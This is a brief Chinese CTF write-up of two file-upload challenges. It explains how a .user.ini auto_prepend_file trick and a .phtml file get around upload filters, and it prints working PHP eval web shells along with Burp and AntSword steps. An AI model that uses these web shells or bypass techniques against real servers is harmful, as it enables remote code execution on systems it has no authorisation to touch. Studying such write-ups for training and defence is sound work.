# 文件上传

## 攻防世界easyupload

参考[[文件上传\]浅析.user.ini的利用-CSDN博客](https://blog.csdn.net/cosmoslin/article/details/120793126)

本题利用.user.ini文件上传

首先创建.user.ini

.user.ini文件内容如下

```
GIF89a 				//图片头欺骗
auto_prepend_file = 1.jpg 				//使同级目录下所有php文件包含1.jpg
```

接下来创建1.txt内容为

```
GIF89a						//文件头欺骗
<?=eval($_POST['shell']);?>				//一句话木马
```

上传burp抓包修改文件名为1.jpg

上传成功蚁剑链接/uploads/index.php

根目录拿到flag

## [ACTF2020 新生赛]Upload

访问IP有个灯泡，鼠标移动到灯泡上发现上传点

随便上传个一句话木马

提示只能上传文件，burp抓包绕过前端验证

发现后端也有验证

随机分配文件名所以.htaccess文件行不通

传入1.phtml文件，phtml是一个嵌入了php脚本的html页面，内容如下

```
<script language='php'>@eval($_POST['a']);</script>
```

上传成功，weshell工具连接拿到flag



